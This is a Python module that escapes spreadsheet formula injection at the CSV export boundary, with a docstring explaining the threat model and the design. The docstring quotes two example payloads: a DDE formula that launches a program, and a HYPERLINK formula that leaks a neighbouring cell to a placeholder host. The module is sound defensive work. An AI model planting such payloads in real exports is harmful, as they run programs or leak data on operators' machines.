"""Neutralise spreadsheet formula injection at the CSV boundary (CWE-1236).

Excel, LibreOffice and Google Sheets evaluate any cell whose first character is `=`, `+`,
`-` or `@` as a FORMULA, not text. A field we merely stored and echoed back therefore
becomes code the moment an operator double-clicks the export. The classic payloads are not
subtle — `=cmd|'/c calc'!A0` runs a program, and `=HYPERLINK("http://x/?"&A1,"click")`
quietly exfiltrates the neighbouring cell — and neither needs macros enabled.

WHY THIS ARRIVES NOW. Every row in these exports used to come from Google Places, which is
curated and whose business names are effectively trusted. The directory importer changes
the threat model: Overture is an open, user-contributed dataset, and Phase 1 alone brings
~39k names nobody vetted. The exposure did not appear because the code changed — it
appeared because the DATA SOURCE did.

WHERE THE FIX BELONGS. At the SINK, never at the source. The database keeps the true value,
so a name really called "+1 Plumbing" is stored intact and every internal consumer sees it
unchanged; only the rendered CSV artifact is defanged. Sanitising on the way IN would
corrupt the record permanently and still miss any row written before the fix landed.

ORIGIN. This logic is not new — `reel_machine.videos_cockpit` has shipped it correctly for
months, because scraped reel transcripts were always untrusted. It moved here unchanged
after the GTM exporter shipped WITHOUT it. That is the real lesson and the reason this
lives in `core`: a security control that sits inside one feature module is a control the
next module does not know exists. One implementation, imported everywhere.

THE COST, stated honestly: a legitimate name beginning with one of these characters gains a
leading apostrophe in the export, which a downstream sender would merge into its copy. That
is a cosmetic blemish on a rare row. The alternative is arbitrary code execution on the
operator's machine, so the trade is not close.
"""

# The four formula leaders, plus the two control characters spreadsheets treat as a
# formula lead-in after their own whitespace trimming. Tab and CR matter because a cell
# like "\t=cmd|..." is trimmed to "=cmd|..." by the parser before it is evaluated.
_DANGEROUS_LEAD = ("=", "+", "-", "@", "\t", "\r")


def safe_cell(value) -> str:
    """One CSV cell, rendered so no spreadsheet will execute it.

    A dangerous leading character is escaped with a single quote, which every major
    spreadsheet reads as "the rest of this cell is literal text". Everything else is
    returned untouched — this must not reformat ordinary data.
    """
    if value is None:
        return ""
    s = str(value)
    if s and s[0] in _DANGEROUS_LEAD:
        return "'" + s
    return s


def safe_row(row: dict) -> dict:
    """Every value in one row passed through `safe_cell`. Keys are ours, not the
    attacker's, so they are left alone."""
    return {k: safe_cell(v) for k, v in row.items()}
